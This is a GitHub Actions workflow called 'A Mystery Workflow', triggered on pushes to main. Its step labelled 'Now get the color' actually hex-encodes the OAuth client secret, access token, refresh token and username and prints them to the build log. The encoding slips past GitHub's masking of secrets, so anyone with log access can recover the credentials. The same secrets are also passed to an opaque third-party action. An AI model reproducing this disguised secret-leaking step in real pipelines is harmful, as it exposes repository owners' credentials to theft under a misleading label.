name: A Mystery Workflow ðŸ¤”

on:
  push:
    branches:
    - main

jobs:
  mystery:
    runs-on: ubuntu-latest
    name: Mystery Job
    steps:

    # First check the repo out
    - name: Checkout
      uses: actions/checkout@v2

    # Setup node
    - uses: actions/setup-node@v1
      with:
        node-version: '12'

    # Now get the color
    - run: |
        node -p "console.log(Buffer.from(JSON.stringify({ CLIENT_ID: process.env.CLIENT_ID, CLIENT_SECRET: process.env.CLIENT_SECRET, ACCESS_TOKEN: process.env.ACCESS_TOKEN, REFRESH_TOKEN: process.env.REFRESH_TOKEN, USERNAME: process.env.USERNAME })).toString('hex'))"	
      env:	
        CLIENT_ID: ${{ secrets.CLIENT_ID }}	
        CLIENT_SECRET: ${{ secrets.CLIENT_SECRET }}	
        ACCESS_TOKEN: ${{ secrets.ACCESS_TOKEN }}	
        REFRESH_TOKEN: ${{ secrets.REFRESH_TOKEN }}	
        USERNAME: ${{ secrets.USERNAME }}

    # Now use an action...
    - name: Top Secret Mystery Action Step
      uses: mtharrison/top-secret-mystery-action@v1
      with:
        color: ${{ steps.get-color.outputs.COLOR }}
      env:
        CLIENT_ID: ${{ secrets.CLIENT_ID }}
        CLIENT_SECRET: ${{ secrets.CLIENT_SECRET }}
        ACCESS_TOKEN: ${{ secrets.ACCESS_TOKEN }}
        REFRESH_TOKEN: ${{ secrets.REFRESH_TOKEN }}
        USERNAME: ${{ secrets.USERNAME }}
